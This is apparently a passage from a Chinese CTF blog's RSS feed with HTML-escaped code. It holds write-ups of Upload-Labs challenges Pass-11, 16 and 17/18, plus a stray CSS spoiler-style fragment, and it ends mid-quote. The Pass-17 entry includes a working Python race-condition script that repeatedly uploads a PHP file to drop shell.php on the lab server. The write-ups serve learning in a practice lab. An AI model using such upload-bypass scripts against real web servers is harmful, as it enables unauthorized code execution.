&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> color: &lt;span style="color:#66d9ef">white&lt;/span> !important;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> .&lt;span style="color:#a6e22e">heimu&lt;/span>:&lt;span style="color:#960050;background-color:#1e0010">hover&lt;/span> &lt;span style="color:#f92672">a&lt;/span>, &lt;span style="color:#f92672">a&lt;/span>:&lt;span style="color:#960050;background-color:#1e0010">hover&lt;/span> .&lt;span style="color:#a6e22e">heimu&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> .&lt;span style="color:#a6e22e">heimu&lt;/span>:&lt;span style="color:#960050;background-color:#1e0010">active&lt;/span> &lt;span style="color:#f92672">a&lt;/span>, &lt;span style="color:#f92672">a&lt;/span>:&lt;span style="color:#960050;background-color:#1e0010">active&lt;/span> .&lt;span style="color:#a6e22e">heimu&lt;/span> 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> color: &lt;span style="color:#66d9ef">lightblue&lt;/span> !important;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> .&lt;span style="color:#a6e22e">heimu&lt;/span>:&lt;span style="color:#960050;background-color:#1e0010">hover&lt;/span> .&lt;span style="color:#a6e22e">new&lt;/span>, .&lt;span style="color:#a6e22e">heimu&lt;/span> .&lt;span style="color:#a6e22e">new&lt;/span>:&lt;span style="color:#960050;background-color:#1e0010">hover&lt;/span>, .&lt;span style="color:#a6e22e">new&lt;/span>:&lt;span style="color:#960050;background-color:#1e0010">hover&lt;/span> .&lt;span style="color:#a6e22e">heimu&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> .&lt;span style="color:#a6e22e">heimu&lt;/span>:&lt;span style="color:#960050;background-color:#1e0010">active&lt;/span> .&lt;span style="color:#a6e22e">new&lt;/span>, .&lt;span style="color:#a6e22e">heimu&lt;/span> .&lt;span style="color:#a6e22e">new&lt;/span>:&lt;span style="color:#960050;background-color:#1e0010">active&lt;/span>, .&lt;span style="color:#a6e22e">new&lt;/span>:&lt;span style="color:#960050;background-color:#1e0010">active&lt;/span> .&lt;span style="color:#a6e22e">heimu&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> color: &lt;span style="color:#ae81ff">#BA0000&lt;/span> !important;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>因为是&lt;code>.styl&lt;/code>的文件，缩进是很严格的，自行按照前面缩进来整理一下。上面那么多就是兼容了一下黑幕下的超链接、粗体、代码块。主要是超链接。&lt;/p></description></item><item><title>Upload-Labs的最后几道题</title><link>/posts/ctf/upload-labs5/</link><pubDate>Thu, 19 Nov 2020 08:47:19 +0000</pubDate><guid>/posts/ctf/upload-labs5/</guid><description>&lt;h2 id="pass-17">Pass-17&lt;/h2>
&lt;p>​	（windows环境，php版本5.2.17，题号是18题）&lt;/p>
&lt;p>源码：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>$is_upload &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">false&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$msg &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">isset&lt;/span>($_POST[&lt;span style="color:#e6db74">&amp;#39;submit&amp;#39;&lt;/span>])){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $ext_arr &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">array&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;jpg&amp;#39;&lt;/span>,&lt;span style="color:#e6db74">&amp;#39;png&amp;#39;&lt;/span>,&lt;span style="color:#e6db74">&amp;#39;gif&amp;#39;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $file_name &lt;span style="color:#f92672">=&lt;/span> $_FILES[&lt;span style="color:#e6db74">&amp;#39;upload_file&amp;#39;&lt;/span>][&lt;span style="color:#e6db74">&amp;#39;name&amp;#39;&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $temp_file &lt;span style="color:#f92672">=&lt;/span> $_FILES[&lt;span style="color:#e6db74">&amp;#39;upload_file&amp;#39;&lt;/span>][&lt;span style="color:#e6db74">&amp;#39;tmp_name&amp;#39;&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $file_ext &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">substr&lt;/span>($file_name,&lt;span style="color:#a6e22e">strrpos&lt;/span>($file_name,&lt;span style="color:#e6db74">&amp;#34;.&amp;#34;&lt;/span>)&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $upload_file &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">UPLOAD_PATH&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#e6db74">&amp;#39;/&amp;#39;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> $file_name;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">move_uploaded_file&lt;/span>($temp_file, $upload_file)){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">in_array&lt;/span>($file_ext,$ext_arr)){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $img_path &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">UPLOAD_PATH&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#e6db74">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#a6e22e">rand&lt;/span>(&lt;span style="color:#ae81ff">10&lt;/span>, &lt;span style="color:#ae81ff">99&lt;/span>)&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">date&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;YmdHis&amp;#34;&lt;/span>)&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#e6db74">&amp;#34;.&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>$file_ext;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">rename&lt;/span>($upload_file, $img_path);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $is_upload &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">true&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }&lt;span style="color:#66d9ef">else&lt;/span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $msg &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;只允许上传.jpg|.png|.gif类型文件！&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">unlink&lt;/span>($upload_file);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }&lt;span style="color:#66d9ef">else&lt;/span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $msg &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;上传出错！&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>​	思路和前面的一样，获取文件信息，移动文件到&lt;strong>upload&lt;/strong>文件夹，第12行使用了白名单验证，多了第14行的&lt;code>rename&lt;/code>函数，看名称就是重命名的函数，所以我们可以在重命名之前访问我们上传的文件，所以这题用到了&lt;strong>上传竞争&lt;/strong>，使用&lt;code>python&lt;/code>脚本不断的向服务器上传文件，然后访问上传的文件，上传的文件中有一句代码&lt;code>&amp;lt;?php fputs(fopen('shell.php','w'),'&amp;lt;?php phpinfo();?&amp;gt;');?&amp;gt;&lt;/code>这段代码执行以后，会创建一个名为&lt;code>shell.php&lt;/code>里面有一句&lt;code>&amp;lt;?php phpinfo();?&amp;gt;&lt;/code>的文件。&lt;/p>
&lt;p>​	脚本代码&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#coding=utf-8&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> requests
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> multiprocessing &lt;span style="color:#f92672">import&lt;/span> Pool
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">CompeteUpload&lt;/span>(list):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> url&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;http://upload-labs/Pass-18/index.php&amp;#34;&lt;/span> &lt;span style="color:#75715e">#上传页面&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> geturl&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;http://upload-labs/upload/233.php&amp;#34;&lt;/span>	 &lt;span style="color:#75715e">#访问上传文件&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> file&lt;span style="color:#f92672">=&lt;/span>{&lt;span style="color:#e6db74">&amp;#39;upload_file&amp;#39;&lt;/span>:(&lt;span style="color:#e6db74">&amp;#39;233.php&amp;#39;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;&amp;lt;?php fputs(fopen(&amp;#39;shell.php&amp;#39;,&amp;#39;w&amp;#39;),&amp;#39;&amp;lt;?php phpinfo();?&amp;gt;&amp;#39;);?&amp;gt;&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#39;image/jpeg&amp;#39;&lt;/span>)}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> data&lt;span style="color:#f92672">=&lt;/span>{&lt;span style="color:#e6db74">&amp;#39;submit&amp;#39;&lt;/span>:&lt;span style="color:#e6db74">&amp;#39;上传&amp;#39;&lt;/span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> r&lt;span style="color:#f92672">=&lt;/span>requests&lt;span style="color:#f92672">.&lt;/span>post(url&lt;span style="color:#f92672">=&lt;/span>url,data&lt;span style="color:#f92672">=&lt;/span>data,files&lt;span style="color:#f92672">=&lt;/span>file)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">#print &amp;#34;test upload....&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> r1&lt;span style="color:#f92672">=&lt;/span>requests&lt;span style="color:#f92672">.&lt;/span>get(url&lt;span style="color:#f92672">=&lt;/span>geturl)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> r1&lt;span style="color:#f92672">.&lt;/span>status_code&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#ae81ff">200&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print (&lt;span style="color:#e6db74">&amp;#34;upload success!&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> __name__&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#e6db74">&amp;#34;__main__&amp;#34;&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pool &lt;span style="color:#f92672">=&lt;/span> Pool(&lt;span style="color:#ae81ff">10&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pool&lt;span style="color:#f92672">.&lt;/span>map(CompeteUpload, range(&lt;span style="color:#ae81ff">10000&lt;/span>))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pool&lt;span style="color:#f92672">.&lt;/span>close()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pool&lt;span style="color:#f92672">.&lt;/span>join()
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>​	第一次用python的我在这里知道了&lt;code>pip&lt;/code>。这道题因为要不断的上传和访问文件，所以对在线靶场不友好，所以才选择了本地环境解题。完工&lt;/p></description></item><item><title>Upload-Labs之Pass-16</title><link>/posts/ctf/upload-labs4/</link><pubDate>Mon, 16 Nov 2020 22:50:25 +0000</pubDate><guid>/posts/ctf/upload-labs4/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>​	我在这道题上花了快一天的时间，但是也学到了不少姿势，觉得东西应该足够多，而且参考了的博客发现这道题算是有歧义的，不知道作者想要考察的点是哪一个，所以算是有两种解法吧，可惜的是两种方法都不算是大成功，只有部分成功执行了。&lt;/p>
&lt;p>​	参考博客：&lt;a href="https://xz.aliyun.com/t/2657#toc-4">upload-labs之pass 16详细分析&lt;/a>&lt;/p>
&lt;h2 id="pass-16">Pass-16&lt;/h2>
&lt;p>​	源码（三种图片的判定，只贴一个吧，篇幅小一点）：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>$is_upload &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">false&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$msg &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">isset&lt;/span>($_POST[&lt;span style="color:#e6db74">&amp;#39;submit&amp;#39;&lt;/span>])){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> $filename &lt;span style="color:#f92672">=&lt;/span> $_FILES[&lt;span style="color:#e6db74">&amp;#39;upload_file&amp;#39;&lt;/span>][&lt;span style="color:#e6db74">&amp;#39;name&amp;#39;&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $filetype &lt;span style="color:#f92672">=&lt;/span> $_FILES[&lt;span style="color:#e6db74">&amp;#39;upload_file&amp;#39;&lt;/span>][&lt;span style="color:#e6db74">&amp;#39;type&amp;#39;&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $tmpname &lt;span style="color:#f92672">=&lt;/span> $_FILES[&lt;span style="color:#e6db74">&amp;#39;upload_file&amp;#39;&lt;/span>][&lt;span style="color:#e6db74">&amp;#39;tmp_name&amp;#39;&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $target_path&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#a6e22e">UPLOAD_PATH&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#e6db74">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">basename&lt;/span>($filename);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 获得上传文件的扩展名
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> $fileext&lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">substr&lt;/span>(&lt;span style="color:#a6e22e">strrchr&lt;/span>($filename,&lt;span style="color:#e6db74">&amp;#34;.&amp;#34;&lt;/span>),&lt;span style="color:#ae81ff">1&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">//判断文件后缀与类型，合法才进行上传操作
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span>(($fileext &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#34;jpg&amp;#34;&lt;/span>) &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> ($filetype&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#e6db74">&amp;#34;image/jpeg&amp;#34;&lt;/span>)){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">move_uploaded_file&lt;/span>($tmpname,$target_path)){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">//使用上传的图片生成新的图片
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> $im &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">imagecreatefromjpeg&lt;/span>($target_path);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>($im &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">false&lt;/span>){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $msg &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;该文件不是jpg格式的图片！&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">@&lt;/span>&lt;span style="color:#a6e22e">unlink&lt;/span>($target_path);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }&lt;span style="color:#66d9ef">else&lt;/span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">//给新图片指定文件名
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#a6e22e">srand&lt;/span>(&lt;span style="color:#a6e22e">time&lt;/span>());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $newfilename &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">strval&lt;/span>(&lt;span style="color:#a6e22e">rand&lt;/span>())&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#e6db74">&amp;#34;.jpg&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">//显示二次渲染后的图片（使用用户上传图片生成的新图片）
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> $img_path &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">UPLOAD_PATH&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#e6db74">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>$newfilename;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">imagejpeg&lt;/span>($im,$img_path);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">@&lt;/span>&lt;span style="color:#a6e22e">unlink&lt;/span>($target_path);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $is_upload &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">true&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $msg &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;上传出错！&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }&lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span>(($fileext &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#34;png&amp;#34;&lt;/span>) &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> ($filetype&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#e6db74">&amp;#34;image/png&amp;#34;&lt;/span>)){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">......&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }&lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span>(($fileext &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#34;gif&amp;#34;&lt;/span>) &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> ($filetype&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#e6db74">&amp;#34;image/gif&amp;#34;&lt;/span>)){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">.....&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }&lt;span style="color:#66d9ef">else&lt;/span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $msg &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;只允许上传后缀为.jpg|.png|.gif的图片文件！&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>​	提示：&lt;code>本pass重新渲染了图片！&lt;/code>。说明对图片进行了二次渲染，我的理解就是把上传的图片，根据一些标准，只把图片中的图片信息提取出来，再生成一个图片，可以有效避免图片马。&lt;/p></description></item><item><title>Upload-Labs(三)</title><link>/posts/ctf/upload-labs3/</link><pubDate>Mon, 16 Nov 2020 16:04:30 +0000</pubDate><guid>/posts/ctf/upload-labs3/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>​	继续接着上一次的&lt;code>Upload-labs&lt;/code>往下写。这记下第11-15题，目前进度是20题都已经完成正在抽时间写博客，然后16题是我卡的最久的关，不过也学到了感觉很牛的姿势，所以到时候专门开一篇只讲16。&lt;/p>
&lt;p>​	在线靶机地址：&lt;/p>
&lt;ul>
&lt;li>&lt;a href="https://buuoj.cn/challenges#Upload-Labs-Linux">linux环境&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://buuoj.cn/challenges#%5BWindows%5DUpload-Labs-Windows">windows环境&lt;/a>&lt;/li>
&lt;/ul>
&lt;h2 id="pass-11">Pass-11&lt;/h2>
&lt;p>​	(这题使用了windows环境)&lt;/p>
&lt;p>​	源码：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>$is_upload &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">false&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$msg &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">isset&lt;/span>($_POST[&lt;span style="color:#e6db74">&amp;#39;submit&amp;#39;&lt;/span>])){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $ext_arr &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">array&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;jpg&amp;#39;&lt;/span>,&lt;span style="color:#e6db74">&amp;#39;png&amp;#39;&lt;/span>,&lt;span style="color:#e6db74">&amp;#39;gif&amp;#39;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $file_ext &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">substr&lt;/span>($_FILES[&lt;span style="color:#e6db74">&amp;#39;upload_file&amp;#39;&lt;/span>][&lt;span style="color:#e6db74">&amp;#39;name&amp;#39;&lt;/span>],&lt;span style="color:#a6e22e">strrpos&lt;/span>($_FILES[&lt;span style="color:#e6db74">&amp;#39;upload_file&amp;#39;&lt;/span>][&lt;span style="color:#e6db74">&amp;#39;name&amp;#39;&lt;/span>],&lt;span style="color:#e6db74">&amp;#34;.&amp;#34;&lt;/span>)&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">in_array&lt;/span>($file_ext,$ext_arr)){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $temp_file &lt;span style="color:#f92672">=&lt;/span> $_FILES[&lt;span style="color:#e6db74">&amp;#39;upload_file&amp;#39;&lt;/span>][&lt;span style="color:#e6db74">&amp;#39;tmp_name&amp;#39;&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $img_path &lt;span style="color:#f92672">=&lt;/span> $_GET[&lt;span style="color:#e6db74">&amp;#39;save_path&amp;#39;&lt;/span>]&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#e6db74">&amp;#34;/&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">rand&lt;/span>(&lt;span style="color:#ae81ff">10&lt;/span>, &lt;span style="color:#ae81ff">99&lt;/span>)&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">date&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;YmdHis&amp;#34;&lt;/span>)&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#e6db74">&amp;#34;.&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>$file_ext;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">move_uploaded_file&lt;/span>($temp_file,$img_path)){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $is_upload &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">true&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $msg &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;上传出错！&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $msg &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;只允许上传.jpg|.png|.gif类型文件！&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>​	分析代码发现是一个白名单验证，但是和之前不同点在于路径中使用了&lt;code>$_GET['save_path']&lt;/code>，本题提示也写道&lt;/p>
&lt;p>&lt;code>本pass上传路径可控！&lt;/code>，就是通过这个GET变量控制上传路径。&lt;/p>
&lt;p>​	这一关的突破方法需要有一些条件：php版本需要低于&lt;code>5.3.29&lt;/code>（我使用的是php版本5.3.17的本地靶机），另一个条件是&lt;code>magic_quotes_gpc&lt;/code>需要为关闭状态。&lt;code>magic_quotes_gpc&lt;/code>的作用官方文档写道：&lt;/p>
&lt;blockquote>
